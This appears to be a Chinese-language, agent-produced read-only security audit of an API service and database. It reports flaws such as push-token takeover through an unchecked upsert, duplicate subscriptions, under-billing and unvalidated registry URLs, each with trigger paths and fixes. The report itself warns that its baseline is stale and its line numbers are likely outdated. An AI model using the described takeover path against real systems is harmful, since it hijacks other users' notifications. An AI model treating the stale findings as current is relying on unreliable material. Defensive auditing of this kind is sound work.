<!--
  © 2026 IHUI AI (智汇AI) · 版权所有者: 李春川 (Li Chunchuan) · https://aizhs.top
  Provenance-watermarked. 未授权商用可被溯源追责 (Apache-2.0 须保留本声明与 NOTICE)。
  [IHUI-AI-PROVENANCE]:⁠​‌​​‌​​‌‍‍​‌​​‌​​​‍‍​‌​‌​‌​‌‍‍​‌​​‌​​‌‍‍​​‌​‌‌​‌‍‍​‌​​​​​‌‍‍​‌​​‌​​‌‍‍‌​‌‌​‌‌‌‍‍‌‌​​‌‌​​‌‌‌‌​‌​‍‍‌‌​‌‌​​​‌​​​‌‌‌‍‍​‌​​​​​‌‍‍​‌​​‌​​‌‍‍‌​‌‌​‌‌‌‍‍‌‌​​‌‌‌​‌​​‌‌‌​‍‍‌‌​​‌‌​​​‌​​‌​‌‍‍‌​‌‌‌​‌‌‌​‌‌‌​‌‍‍‌​‌‌​‌‌‌‍‍​‌​​‌‌​​‍‍​‌​​​​‌‌‍‍‌​‌‌​‌‌‌‍‍​‌‌​​​​‌‍‍​‌‌​‌​​‌‍‍​‌‌‌‌​‌​‍‍​‌‌​‌​​​‍‍​‌‌‌​​‌‌‍‍​​‌​‌‌‌​‍‍​‌‌‌​‌​​‍‍​‌‌​‌‌‌‌‍‍​‌‌‌​​​​‍‍‌​‌‌​‌‌‌‍‍​‌​‌​​​​‍‍​‌​‌​​‌​‍‍​‌​​‌‌‌‌‍‍​‌​‌​‌‌​‍‍​‌​​​‌​‌‍‍​‌​​‌‌‌​‍‍​‌​​​​​‌‍‍​‌​​‌‌‌​‍‍​‌​​​​‌‌‍‍​‌​​​‌​‌‍‍​​‌​‌‌​‌‍‍​​‌‌​​‌​‍‍​​‌‌​​​​‍‍​​‌‌​​‌​‍‍​​‌‌​‌‌​⁠
-->

> 【过期快照警告 · 执行前必读】本报告基线 `d4e1621806` 远早于当前 `origin/main`（`e2b004b74940af915320eefa22c8c12093009e7e`）。
> 文中行号与「当场可修」结论大概率已失效，曾被误当作当前真相并误导后续 agent（已因此浪费一轮验证）。
> 凡 `PROJECT_PLAN.md` 引用本报告的任一条目，动手前**必须先对照当前代码复核**（强制纪律见 `RECONCILE-findings-staleness.md` 第四节）。
> 已确认在当前代码修复的条目，见文内 `【已修复@当前代码】` 标注。

# services/** 剩余 + packages/database 反向核对（只读审计）

- 基线：`origin/main` @ `d4e1621806`（第五轮 `git fetch origin --prune` 后实测；前四轮为 `89a5938f0c`。工作树另有未提交改动，所有结论均以 origin/main 版本为准）
- 纪律：全程只读；未改仓库、未提交、未 push；未跑迁移、未跑测试
- 去重台账：`PROJECT_PLAN.md`、`scripts/data/plan-fields.jsonl`、`findings-api.md`（F-001~F-681）、`findings-db.md`（DB-01~DB-46）
- 统计：**累计新增 56 条**（第一轮 6：P1×1 / P2×3 / P3×2；第二轮 1：P3；第三轮 2：P2×1 / P3×1；第四轮 17：P2×11 / P3×6，见 §十四；**第五轮 30：P1×5 / P2×12 / P3×13，见 §十八；二次取证后修正为 P1×4 / P2×9 / P3×17，见 §二十二**）、**已否证 30 组**（第五轮 6 组见 §十九；二次取证再否证 5 组见 §二十二）、**未判定 13 条**（第五轮新增 13 条已全部定论：8 成立 / 5 否证；余 13 条为前四轮存量）

---

## 一、本轮新增

### SDB-01 推送令牌全局唯一 + upsert 直接改 `user_id`，任何登录用户可接管他人设备令牌

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/devices.ts:73-99`；`packages/database/src/schema/device-tokens.ts:32-54`；`packages/database/drizzle/0225_create_device_tokens.sql:23`
- **触发路径**：已登录用户 A 调 `PUT /api/devices/token {"token":"<用户B的FCM/个推token>","platform":"android"}`。
- **根因**：`device_tokens.token` 是全局唯一索引，冲突分支 `onConflictDoUpdate({ target: deviceTokens.token, set: { userId, ... } })` 无归属校验，直接把 `user_id` 改成调用者；同一表上的 `DELETE /devices/token` 却按 `userId` 过滤，两端口径不一致。
- **证据**：
  - `devices.ts:87-99`：`onConflictDoUpdate({ target: deviceTokens.token, set: { userId, ... } })`
  - `0225_create_device_tokens.sql:23`：`CREATE UNIQUE INDEX ... "device_tokens_token_unique" ON "device_tokens" ("token")`
  - `device-tokens.ts:53`：`tokenUnique: unique('device_tokens_token_unique').on(t.token)`
- **影响面**：掌握或猜到他人 token 即可把该设备的推送改投到自己账号（验证码、订单、私信摘要等）；原用户静默失去推送且无告警。共享设备换账号登录时也会把令牌从旧账号剥离。
- **建议修法**：冲突时先 `select userId`，与当前用户不一致直接 409；或改为 `where token = ? and user_id = ?` 的条件 upsert，不匹配则不更新。
- **是否当场可修**：是。

### SDB-02 `api_subscriptions.order_no` 幂等键无唯一约束，先查后插（读副本）可并发重复建订阅

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/subscription-window-service.ts:366-373,396-412`；`packages/database/src/schema/billing.ts:252-256`；`packages/database/drizzle/20260916170000_api_subscription_windows_and_peak_pricing.sql:54`；`packages/database/drizzle/20261106150000_fix_missing_indexes_fks.sql:59-60`
- **触发路径**：同一笔支付的两个回调（重投 / 支付网关并发通知）同时到达 `POST /api/subscription/...`（或任意走 `createSubscriptionForOrder` 的入口）。
- **根因**：函数文档承诺「同一 orderNo 已创建过订阅时直接返回既有实例（回调重试安全）」，但去重是 `dbRead` 事务外先查；`order_no` 在 schema 与全部迁移里只有普通 index，没有 UNIQUE，第二个请求查不到后照常 insert。
- **证据**：
  - `subscription-window-service.ts:367-372`：`dbRead.select().from(apiSubscriptions).where(eq(apiSubscriptions.orderNo, input.orderNo)).limit(1)`
  - `subscription-window-service.ts:396-412`：无条件 `db.insert(apiSubscriptions)`
  - `billing.ts:255`：`orderNoIdx: index('api_subscriptions_order_no_idx').on(t.orderNo)`（index，非 unique）
  - 修复迁移 `20261106150000` 只补了 `ix_api_subscriptions_plan_id` / `ix_api_subscriptions_order_id`，未补 order_no 唯一
- **影响面**：同一 orderNo 产生两条 `active` 订阅 → `getActiveSubscription` 取 startAt 最新一条，窗口额度按重叠区间双算；续费叠加逻辑（`:380-394`）读到两条时基准 `endAt` 可能翻倍，用户获得双倍有效期。
- **建议修法**：加 `CREATE UNIQUE INDEX CONCURRENTLY ... ON api_subscriptions(order_no) WHERE order_no IS NOT NULL`；插入改为 `onConflictDoNothing({ target: orderNo })` 后回查，或捕获 23505 返回既有行。
- **是否当场可修**：是（需按线上数据先查重）。

### SDB-03 `validityDays = 0`（文档语义「不过期」）被静默改成 30 天

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/subscription-window-service.ts:375-378`；`apps/api/src/services/api-subscription-service.ts:54,480`；`apps/api/src/routes/admin-api-platform.ts:46,65`
- **触发路径**：后台把套餐 `validityDays` 配成 0（建套餐与更新套餐两处 zod 均为 `.min(0)`），用户购买该套餐。
- **根因**：字段注释明确定义 `0 = 不过期`，但创建订阅时 `Number.isFinite(...) && input.validityDays > 0 ? floor : 30`，把 0（以及负数）一律落成 30 天；`api-subscription-service.ts:480` 同样以 `?? 30` 兜底。
- **证据**：
  - `api-subscription-service.ts:54`：`/** 有效期(天);0 = 不过期 */`
  - `admin-api-platform.ts:46` / `:65`：`validityDays: z.number().int().min(0).max(3650).optional()`
  - `subscription-window-service.ts:375-378`：`> 0 ? Math.floor(...) : 30`
- **影响面**：按「不过期」配置售出的套餐 30 天后订阅到期，日/周/月窗口额度整体失效；Key 余额仍在，用户表现为「突然被限流/降级」。购买页展示的仍是后台配的文案，与系统实际行为不一致。
- **建议修法**：把 0 解释为「无到期日」（`endAt` 写 `9999-12-31` 或 NULL + 读取处兼容），仅 `undefined/NaN` 才兜底 30；同时让管理端显式区分「未填」与「不过期」。
- **是否当场可修**：是（需产品确认 0 的语义）。

### SDB-04 仅配「不限」窗口（-1）时，`Math.max` 兜底把总配额算成 0，新 Key 被余额检查直接拒绝

- **严重度**：P1
- **文件与行号**：`apps/api/src/services/api-subscription-service.ts:341-353,443,449`；`apps/api/src/services/relay-billing-service.ts:402-412,461-483`
- **触发路径**：套餐 `dailyTokenLimit=-1`（且周/月为 0），或 `monthlyTokenLimit=-1`（日/周为 0）→ 购买 → 首次自动建 Key → 带该 Key 发起任意 relay 请求。
- **根因**：未在 features 声明总量时，`tokenQuota = Math.max(daily, weekly, monthly)`；窗口语义 `-1 = 不限`，与 0 一起取 max 得 0。新 Key `tokenBalance = Math.max(0, 0) = 0`。窗口检查对 -1 放行（`:402`），随后个人余额检查 `row.tokenBalance !== -1 && tokenBalance < estimatedTokens`（`:474`）拒绝。
- **证据**：
  - `api-subscription-service.ts:348-353`：`declaredQuota !== 0 ? declaredQuota : hasWindowLimits ? Math.max(...) : 0`
  - `api-subscription-service.ts:443`：`tokenBalance: tokenQuota === -1 ? -1 : Math.max(tokenQuota, 0)`
  - `relay-billing-service.ts:402` 窗口检查先执行；`:461-483` 余额检查后执行且无「窗口型订阅豁免」
- **影响面**：该配置下的付费套餐 100% 不可用（每次都返回 `no_balance_token`），且购买流程显示成功；管理员无从察觉（无报错）。
- **建议修法**：`Math.max` 前过滤掉 `-1`，只要存在任一 -1 就把 `tokenQuota` 置 -1；或对「有活跃窗口订阅且窗口未超」的 Key 跳过余额检查。
- **是否当场可修**：是。

### SDB-05 无限配额支路不写 `token_flows` 幂等流水，且 `balanceAfter` 恒写 0

- **严重度**：P3
- **文件与行号**：`apps/api/src/services/api-subscription-service.ts:404-428,453-462`
- **触发路径**：购买 `tokenQuota=-1` 的套餐，或对余额已是 `-1` 的 Key 再购 quota>0 套餐。
- **根因**：两条支路 `appliedQuota = 0`，而写流水被 `if (orderNo && appliedQuota > 0)` 守卫；同时该流水 `balanceAfter: 0` 写死，与仓库其他 `tokenFlows` 写法（如实写扣减后余额）不一致。
- **证据**：
  - `api-subscription-service.ts:409,414,427`：三处置 `appliedQuota = 0`
  - `api-subscription-service.ts:453-462`：守卫 + `balanceAfter: 0`
  - 对照 `relay-billing-service.ts:1535-1541`：`balanceAfter: newWalletBalance`
- **影响面**：注释承诺的「op_type=6 幂等标记」在无限套餐下不存在，回调重放无审计痕迹；财务对账取 `balanceAfter` 得到全 0，无法还原发放后余额。
- **建议修法**：幂等标记与发放量解耦（有 orderNo 就写，quantity 记 0 或 -1 语义），`balanceAfter` 写事务内读到的实际余额。
- **是否当场可修**：是。

### SDB-06 RateLimiter 的 `incr` 与 `expire` 非原子，key 无 TTL 后计数永久累积

- **严重度**：P3
- **文件与行号**：`apps/api/src/services/security-service.ts:48-75`
- **触发路径**：`incr` 成功后进程崩溃 / Redis 连接在 `expire` 前断开 / 该 key 由旧版本无 TTL 写入；之后该 key 计数只增不减。
- **根因**：`Promise.all([incr(m), incr(h)])` 后仅当返回值 `=== 1` 才 `expire`。一旦错过一次性设置 TTL 的时机，key 永不过期；而 `=== 1` 之后再也不会成立。
- **证据**：
  - `security-service.ts:52-58`：`incr` ×2 → `if (minuteCount === 1) expire(60)` / `if (hourCount === 1) expire(3600)`
  - `security-service.ts:60-73`：超阈值即拒绝，无自愈/清 key 路径
- **影响面**：受影响 IP/用户被永久限流（重启进程也不会恢复，除非人工删 key），属自伤型可用性故障。
- **建议修法**：改 Lua 脚本原子执行 `INCR` + `EXPIRE`（或 `SET key 0 EX 60 NX` 后再 INCR），并对 `TTL === -1` 兜底补 `EXPIRE`。
- **是否当场可修**：是。

---

## 二、已否证（附复核依据，不计入新增）

1. **`commission_flows.order_id` 缺索引** —— 否证。`packages/database/drizzle/20261106150000_fix_missing_indexes_fks.sql:73` 已有 `CREATE INDEX "ix_commission_flows_order_id" ON "commission_flows" ("order_id")`。TS schema `schema/commission.ts:23-40` 未声明该索引，属**schema ↔ 迁移漂移**（`findings-db.md` 已覆盖该类别），不是缺索引。
2. **`order_id` / `device_token` / `new_id` 迁移反向核对** —— 全部一致，否证「缺约束」假设：
   - `edu_payments.order_id` → `0015_order_module.sql:47` `edu_payments_order_idx`；`edu_refunds.order_id` → `:68`；`edu_invoice_applications.order_id` → `:100` `CREATE UNIQUE INDEX`（一单一票的唯一约束符合业务）。
   - `device_tokens.token` → `0225_create_device_tokens.sql:23` UNIQUE 存在；`user_id/platform/is_active` 索引齐全。
   - `id_mapping.new_id` → `0083_create_id_mapping.sql` 建表即带 `id_mapping_new_idx`，另有 legacy 唯一约束，无缺失。
   - `api_subscriptions.order_id` → `20261106150000:60` `ix_api_subscriptions_order_id` 存在（该列无高频按 orderId 查询，也不需要）。
3. **`relay-session-sync-decision.ts` / `-noise.ts` / `-target.ts`** —— 逐分支复核后否证。`decideSync` 对「同票 / 池更新 / 客户端更新」三分支的判据与执行语义一致；`next` 仅在 `apply=true` 时被调用方消费，不存在「apply=false 却写库」；`chooseSyncTargetRow` 在 0 行/多行歧义时返回 `ambiguous` 而非猜测。未发现可证实的错写、错删或越权同步。
4. **`distributed-transaction.ts` 补偿失败仅记录日志** —— 否证为缺陷。文件头与实现明示「补偿失败不中断回滚、记录后继续」，且最终返回 `success:false`，属已文档化的降级策略，不是静默成功。
5. **`settlement-service.ts` 月切分 / `storage-service.ts` 分片会话** —— 去重不报。前者与 **F-228**（多期只落一期、幂等仅按 orderNo、金额不按月摊）完全重合；后者与 **F-382**（进程内 Map、TTL 不 Abort、多实例互删）完全重合。本轮新增观察仅「UploadPart 不校验 TTL」等 P3 语义瑕疵，按纪律不单列。

---

## 三、未判定（写清缺什么证据）

1. **`vendor-caller-service.ts:140-174` 是否构成 SSRF** —— 缺「用户可控」链路证据。`url = authResult.url ?? baseUrl + endpoint`；`baseUrl` 来自厂商注册表，`endpoint` 由调用方传入，但全仓未找到任何路由把请求参数拼进 `endpoint`/`baseUrl` 的证据。需补：列出所有 `VendorCallContext` 构造点并确认 endpoint 常量来源，才能判定。
2. **`decideSync` 同票但客户端新增 refreshToken 时不同步** —— 缺触发证据。理论上「access token 相同、refresh token 新出现」会导致池侧永远收不到 refresh token，但没有找到该状态真实产生的路径（刷新流程是否可能只换 refreshToken 而不换 access token 未证实）。

---

## 四、覆盖清单

- `apps/api/src/services` 下非测试 `.ts` 共 **365** 个；`findings-api.md` 已引用 **81** 个，**未被引用 138** 个（与「剩余 113」同量级，以实测为准）。
- 本轮**逐行深读（12）**：`settlement-service.ts`、`subscription-window-service.ts`、`api-subscription-service.ts`、`storage-service.ts`(642-823)、`relay-session-sync-decision.ts`、`-noise.ts`、`-target.ts`、`security-service.ts`(38-76)、`api-key-tpm-service.ts`(120-230)、`distributed-transaction.ts`、`vendor-caller-service.ts`(100-190)、`relay-billing-service.ts`(360-500,1528-1546)。
- 本轮**新读旁证（5）**：`routes/devices.ts`、`routes/admin-api-platform.ts`、`schema/billing.ts`、`schema/device-tokens.ts`、`schema/id-mapping.ts`、`schema/commission.ts`。
- **DB 反向核对覆盖**：`order_id` 共 11 处（billing.payments / api_subscriptions / commission_flows / developer.* / edu_payments / edu_refunds / edu_invoice_applications / refund_audit_records / relay_invoice_requests / relay_corporate_payments / vip.*）、`device_token` 1 表（另 `edu_notification_device` 已在 F-680 覆盖）、`new_id` 1 表（id_mapping）。
- **未扫（约 126 个）**：`upstream-adapters/*`（21）、`clawdbot/*`（20+）、`automations/*`（10）、`cli-import/*`（15+）、`registry-sync/*`（5）、`message-bus/*`（7）、`tour/*`（6）、`ai/*`（9），以及 `vendor-*`、`webhook-*` 的剩余分支。本轮派出的 3 个子代理只返回了「相关代码位置」而无可证实结论，其输出未计入任何结论。

---

## 五、仍可深挖方向

1. `upstream-adapters/*` 的 SSE 结束判定与 `AbortSignal` 透传（21 个适配器逐个比对，最可能藏流式悬挂/重复计费）。
2. `clawdbot/*` 的 `safe-condition` 求值器边界（除零、字符串比较、`Identifier` 未定义时的默认值）与 `tool-executor` 的权限旁路。
3. `api-key-tpm-service.ts` 的 TPM 双写（Redis Lua + DB UPSERT）：DB 失败仅告警时，重启后 Redis 与 DB 计数不一致的方向尚未核对。
4. `relay-billing-service.ts` 组池余额分支（`:414-458`）与个人余额分支的 `costBalanceCents` 语义是否与窗口型订阅冲突（本轮只验证了余额短路，未验证扣费回写）。
5. `packages/database` 中「schema 未声明但迁移已建」的全量漂移清单（本轮只核了 3 类列，`ix_commission_flows_*` 这类已发现示例说明漂移面可能较大）。

---

# 第二轮：services 剩余文件扫掠 + 两条未判定复核

## 六、第二轮新增

### SDB-07 CodeArts / Qoder 刷新用「编造 TTL」兜底 `expiresAt`，违反 `TokenRefreshResult` 契约

- **严重度**：P3
- **文件与行号**：`apps/api/src/services/upstream-adapters/codearts-adapter.ts:58,397`；`apps/api/src/services/upstream-adapters/qoder-adapter.ts:450-453`；契约定义 `apps/api/src/services/relay-upstream-adapters.ts:108-113`
- **触发路径**：上游刷新返回 200，但 `credentials.expiration`（CodeArts）或 `expires_at` + 新票 JWT `exp`（Qoder）全部缺失。
- **根因**：契约白纸黑字要求「`expiresAt` 只许取上游响应当场给出的值，上游未给 ⇒ null；禁止沿用旧值或编造兜底时刻」，并注明该列曾被用来冒充「票仍可用」（2026-10-23 事故）。两个 adapter 仍分别兜底 `now + 2h`（`DEFAULT_CREDENTIAL_TTL_MS`）与 `now + 24h`。
- **证据**：
  - `relay-upstream-adapters.ts:110-111`：`上游未给/解析不出 ⇒ null(= 未知);禁止沿用旧值或编造兜底时刻`
  - `codearts-adapter.ts:397`：`expiresAt: expiresAt ?? new Date(Date.now() + DEFAULT_CREDENTIAL_TTL_MS)`
  - `qoder-adapter.ts:453`：`new Date(Date.now() + 24 * 3600_000)`
- **影响面**：库内 `expiresAt` 写成未来时刻，调度器的「到期前刷新」判据失效，票实际已失效却不在刷新窗口内 → 该账号持续 401 直到健康检查兜底；与契约所记事故同型。触发前提是上游缺字段（现网多数返回该字段），故定 P3。
- **建议修法**：按契约返回 `null`，由调度器对 `null` 立即刷新；若确需保守值，必须与「真实到期」分列存储，不能写进 `expires_at`。
- **是否当场可修**：是。

## 七、第二轮未判定

1. **`clawdbot/integrations.ts:156`、`clawdbot/self-evolution.ts:78`、`automations/github-client.ts:72` 出站 fetch 未显式设超时** —— 缺两项证据：① Node undici 默认 `headersTimeout/bodyTimeout=300s` 是否被运维修约可接受（不是无限挂起，故未判缺陷）；② `self-evolution` 向 `http://localhost:${PORT}` 自调用，在连接池打满时是否死锁未实测。
2. **`registry-sync/*-adapter.ts` 外部数据落库前的长度/URL 校验** —— 只读到映射层（`mcp-marketplace-adapter.ts:77-138`），未追到 registry item 落库处的列长度约束与 URL 协议校验，缺「能否写入超长/非 http(s) 值」的落库侧证据。

## 八、第二轮已否证（附复核依据）

1. **`vendor-caller-service` SSRF（第一轮未判定 1）→ 否证结案**：唯一 import 方是 `routes/ai-vendors/proxy-llm.ts:12`，其 6 处 `newCallVendor(...)`（`:1379,1403,1443,1480,1505,1548`）的 `endpoint` 全是字面常量（如 `/compatible-mode/v1/chat/completions`），`baseUrl` 取自 `VENDORS` 静态表，无任何用户输入进入 URL。
2. **`decideSync` 丢弃新 refreshToken（第一轮未判定 2）→ 否证结案**：`decideSync` 输入契约只含 `token/tokenExpiresAt`（不接收 refreshToken），不存在该判定路径；`apps/api/scripts/relay-trae-session-sync.ts:299-300` 明确注释「票一致(same-token)是常态，那一支本来一行凭证都不写」；refreshToken 由 `importAccounts` 独立落库。
3. **`cli-import` 路径穿越 / 批量中断**：入口只有 `POST /cli-import/parse-file`（multipart 上传，服务端不接收路径参数）与 `parse-payload`；`cc-switch-json.ts:89-99` 的 `JSON.parse` 在函数内 try/catch，单个 provider 失败进 `globalWarnings` 不中断整批。
4. **GitHub App 入站 webhook 验签**：`routes/github-app.ts:18,452-469` —— secret 未配置返 503（注释明令禁止 fail-open）、签名缺失/非法/不匹配返 401、比较走 `secretsEqual` 定长比较。
5. **`tour/tour-gray-release.ts` 放量比例**：`:43-57` 用 `contentId+userId` 稳定哈希取模 100，非随机数；0/100 边界先短路，无「全量误放」。
6. **`tour/tour-event-bus.ts` 重试放大**：`:65-96` 有 `maxAttempts` 上限与 `isFinal` 判定，非无限重试。
7. **`upstream-adapters/qoder-cli-bridge.ts:382-401` usage 少计**：`input/output` 缺失补 0 与「上游未给该字段 = 无该类 token」一致；两字段都缺时 `usageOf` 返回 `null`（不伪造 0），未找到少计证据。
8. **`clawdbot/permission-guard.ts` 通配越权、`safe-condition.ts` 注入、`state-machine.ts` 非法跳转**：权限仅精确匹配且默认拒绝；条件是手写 tokenizer + AST（无 eval/new/原型链）；状态机按 `VALID_TRANSITIONS` 拒绝非法转移。均未见绕过路径。

## 九、第二轮覆盖清单

- 本轮**静态扫掠**：对 138 个未引用文件按目录逐个执行危险模式扫描（`JSON.parse` 55 处、`child_process/exec/spawn`、`fetch(` 且全文无 `signal`、硬编码 `expires_in ?? / Date.now()+N`）。
- 本轮**逐行深读（14）**：`codearts-adapter.ts`(372-408)、`qoder-adapter.ts`(424-464)、`qoder-cli-bridge.ts`(368-408)、`relay-upstream-adapters.ts`(100-134)、`clawdbot/integrations.ts`(116-172,27-34)、`clawdbot/self-evolution.ts`(62-94)、`relay-trae-session-sync.ts`(292-347)、`proxy-llm.ts`(1-60,1372-1422)、`github-app.ts`(17-19,452-469)、`automations/github-client.ts`(72)、`automations/executor.ts`(outline)、`tour/tour-gray-release.ts`(39-57)、`tour/tour-event-bus.ts`(65-96)、`token-refresh-service.ts`(115-239 线索)。
- **仍未逐行（约 120 个）**：`upstream-adapters/*` 其余 15 个（trae/workbuddy/doubao/minimax/loomy/lingma/grokbot/opencode/zcode/qoder-models 等）、`clawdbot/*` 其余 14 个、`cli-import/*` 16 个、`automations/*` 8 个、`ai/*` 9 个、`tour/*` 5 个、`message-bus/*` 7 个、`github-app/*` 5 个、`registry-sync/*` 5 个及零散单文件 20 个 —— 仅完成模式扫掠与线索复核，**未达逐行**，不冒充已扫完。
- 子代理（6 路）两次均只返回「相关代码位置」而非可证实结论，其输出未计入任何结论，仅作线索。

---

# 第三轮：按危险面（写库→调外部→算钱）定向深读 + 两条未判定结案

## 十、第三轮新增

### SDB-08 usage 兜底只补 completion，input token 永久计 0（少计费）

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/relay-upstream-forwarder.ts:587-591`；`upstream-adapters/qoder-adapter.ts:383`；`upstream-adapters/trae-adapter.ts:697-703`；`upstream-adapters/trae-protocol.ts:515`；计价侧 `relay-billing-service.ts:771-783`
- **触发路径**：上游不返回 usage，或只返回 `total_tokens`：① Trae 全程未出现 `token_usage` 帧；② Qoder 流结束未给 usage，adapter 直接填 `{0,0,0}`；③ `extractUsage` 在只有 `total_tokens` 时返回 `null`（`trae-protocol.ts:515` 的判据里不含 total）。这些请求都会进入/跳过兜底。
- **根因**：兜底条件写死 `if (stats.totalTokens === 0)`，且兜底体只赋值 `completionTokens`（`responseText.length/4`），**从不估算 `promptTokens`**；而计费公式是 `inputPrice × promptTokens + outputPrice × completionTokens`（`relay-billing-service.ts:771,783`）。另当上游给出 `total>0` 但 `prompt=completion=0` 时，`totalTokens !== 0` 使兜底完全不触发，整单按 0 计费。
- **证据**：
  - `relay-upstream-forwarder.ts:588-590`：`if (stats.totalTokens === 0) { stats.completionTokens = Math.ceil(stats.responseText.length / 4); stats.totalTokens = stats.completionTokens }`
  - `qoder-adapter.ts:383`：`usage: usage ?? { prompt_tokens: 0, completion_tokens: 0, total_tokens: 0 }`
  - `trae-adapter.ts:697-703`：`usage ?? { prompt_tokens: 0, completion_tokens: 0, total_tokens: 0, ... }`
- **影响面**：所有未上报 usage 的上游调用 input 侧零计费（结构性少收）；「只有 total」的上游整单零计费。属平台收入漏洞，不是用户侧故障，也不会报错。
- **建议修法**：兜底时用请求体 `JSON.stringify(messages).length / 4` 估算 `promptTokens`；条件改为 `promptTokens === 0 && completionTokens === 0`；`total>0 且 p=c=0` 时用 `completion = total` 反推并记 `promptTokens=0` 的告警。
- **是否当场可修**：是。

### SDB-09 registry 外部字段落库无长度截断、无 URL 协议校验

- **严重度**：P3
- **文件与行号**：`apps/api/src/services/registry-sync/mcp-marketplace-adapter.ts:97-123`；`apps/api/src/db/registry-queries.ts:248-269`；`packages/database/src/schema/registry.ts:44-50`；`registry-sync/index.ts:57-70`
- **触发路径**：MCP marketplace / 自定义 registry 返回 `name > 200` 或 `homepage/repoUrl/downloadUrl > 500`，或返回 `javascript:` / `file:` 等非 http(s) URL。
- **根因**：`mapMarketplaceItem` 对 `name/homepage/repoUrl/downloadUrl` 只做 `String()`，不截断、不校验协议；`upsertRegistryItem` 原样 insert 到 `varchar(200)` / `varchar(500)`（description 是 text 无限制）。单条溢出会抛 Postgres 错误，被 `index.ts:61-69` 的 **source×type 级** catch 吞掉。
- **证据**：
  - `mcp-marketplace-adapter.ts:111-123`：`homepage: obj.homepage ? String(obj.homepage) : obj.url ? String(obj.url) : ...`（无协议判断）
  - `registry.ts:44,48-50`：`name varchar(200)`、`homepage/repo_url/download_url varchar(500)`
  - `index.ts:57-70`：`for (const t of types) { try { ... } catch { console.warn(...) } }`
- **影响面**：一次同步中该 source×type 的剩余条目全部丢失（静默少数据，日志只有一行 warn）；非 http(s) URL 入库，若前端直接 `href` 渲染则可点即触发脚本（前端证据见 §十一-3，仍未判定）。
- **建议修法**：落库前 `slice(0, 200/500)` + `new URL()` 校验协议白名单（仅 http/https），拒绝或降级为 null。
- **是否当场可修**：是。

## 十一、上一轮 2 条未判定 → 结案

1. **clawdbot / automations 出站 fetch「无超时」→ 否证**。实测依赖版本：`apps/api/node_modules/undici/lib/dispatcher/client.js:318-319` —— `this[kBodyTimeout] = bodyTimeout != null ? bodyTimeout : 300e3`、`this[kHeadersTimeout] = headersTimeout != null ? headersTimeout : 300e3`（300 秒）；运行时 Node v26.6.0 的内置 fetch 为随附 undici，同默认。**结论：不是无限挂起，上限 300s**；300s 是否偏长属运维口径，不构成可证实缺陷。
2. **localhost 自调用死锁 → 否证**。`self-evolution.ts:254` 的 `publishEvolvedSkillToMarket` 位于进化任务处理流程内；`git grep "transaction("` 在 `self-evolution.ts` 与 `clawdbot-service.ts` 零命中，不持有数据库事务/连接；Node 在 `await fetch` 期间可并发处理该 loopback 请求。找不到死锁机制，唯一残余风险是 DB 连接池打满（无证据）。
3. **registry 落库校验 → 结论：无上限、无协议校验**（已升级为 SDB-09）。其中「`javascript:` 等 URL 是否会被前端渲染成可点击脚本」仍 **未判定**：缺前端 `href` 渲染代码与 React 版本的 `javascript:` 阻断行为证据，不在本轮范围。

## 十二、第三轮覆盖与收敛判定

- **本轮新增 2 条（SDB-08/09），未到零新增，故不宣布收敛。**
- 本轮**定段深读（14）**：`relay-upstream-forwarder.ts`(536-593)、`qoder-adapter.ts`(360-391,424-464)、`trae-adapter.ts`(684-705)、`trae-protocol.ts`(498-525)、`qoder-cli-bridge.ts`(368-408)、`registry-sync/index.ts`(40-80)、`mcp-marketplace-adapter.ts`(70-140)、`db/registry-queries.ts`(225-285)、`clawdbot/self-evolution.ts`(36-95,248-262)、`clawdbot/integrations.ts`(116-172)、`automations/github-client.ts`(72)、`automations/goal-loop.ts`(索引)、`tour/tour-gray-release.ts`(39-57)、`packages/database/src/schema/registry.ts`(44-50)。
- 本轮**全量定向 grep 覆盖危险面**：`upstream-adapters/*` 18 个（usage 字段、空 catch、retry、expiresAt 四类模式）、`automations/*` 10 个（循环上界/事务）、`clawdbot/*` 20 个（fetch/权限/Map 上界）、`registry-sync/*` 5 个、`cli-import/*` 16 个（JSON.parse/路径参数）、`tour/*`（随机数/重试）。
- **仍未逐行：约 100 个** —— `upstream-adapters` 15（workbuddy-protocol 968 行、trae-protocol 887 行仅读关键段）、`clawdbot` 14、`cli-import` 14、`ai/*` 9、`automations` 8、`message-bus` 7、`github-app` 5、`tour` 5、`registry-sync` 3、零散单文件 20。其危险模式已扫，函数体未逐行。
- **「已无未逐行文件」的核对方式（留给收敛轮）**：`git ls-tree -r --name-only origin/main -- apps/api/src/services` 取全量 → 剔除 `__tests__`/`*.test.ts` → 与报告各轮「逐行清单」求集合差；差集为空才可宣布收敛。当前差集约 100，故本轮明确不宣布收敛。

---

## 十三、SDB-08 定级复核（本轮专项）

**结论：维持 P2，并更正原描述的机理；不满足升 P1 的第二条件（生产形态未证实）。**

1. **代码可走通性：部分成立，但与原描述不同。**
   - **非流式**路径把上游 `usage` 直接交给 `safeInt`：`v1-public.ts:2040-2058` 的 `usage?.prompt_tokens ?? 0` / `usage?.completion_tokens ?? 0` 经 `safeInt` 后，**显式数字 0 会被原样保留**（`safeInt` 只对非 number 兜底为 ≥1）。而 `trae-adapter.ts` 在非流式转换中于 usage 缺失时填 `usage: { prompt_tokens: 0, completion_tokens: 0, total_tokens: 0 }`。两者相接 ⇒ 非流式 Trae 调用只要上游没回 usage，就按 0/0 记账，整单 0 计费。该链路代码上确实走得通。
   - **流式**路径不成立：`v1-public.ts:852`（及 `:1032`）用 `Math.ceil((opts.promptText ?? '').length / 4)` **本地估算 prompt**；`relay-upstream-forwarder.ts:587-590` 的兜底只补 completion（`totalTokens === 0` 时按正文估）。因此流式不会出现「input 侧恒 0」。
2. **生产形态证据：未找到。** 全仓 grep `"prompt_tokens": 0` / `prompt_tokens: 0` / `total_tokens` 无任何上游回包样例、测试夹具或日志；能命中的只有 `scripts/qoder-chat-bridge.mjs` 与 `ai-service/llm_gateway.py` 自填的 `{0,0,0}`（total 也为 0）。本轮只读、未接生产库，无法证明「Trae/Qoder 非流式响应在线上确实缺 usage」。
3. **升 P1 的判定条件（写清缺什么）**：满足任一条即可升 P1 ——
   - 一条真实 `token_flows` / `ai_call_logs` 记录：`prompt_tokens=0 AND completion_tokens=0` 且同请求响应正文非空、上游为 trae/qoder 非流式；
   - 或抓包/夹具证明 trae 非流式成功响应不含 usage；
   - 或上游协议文档明确非流式不返回 usage。
   在上述之一到手前，按纪律维持 P2，不按「可能」升 P1。

## 十四、第四轮新增（SDB-10 ~ SDB-26）

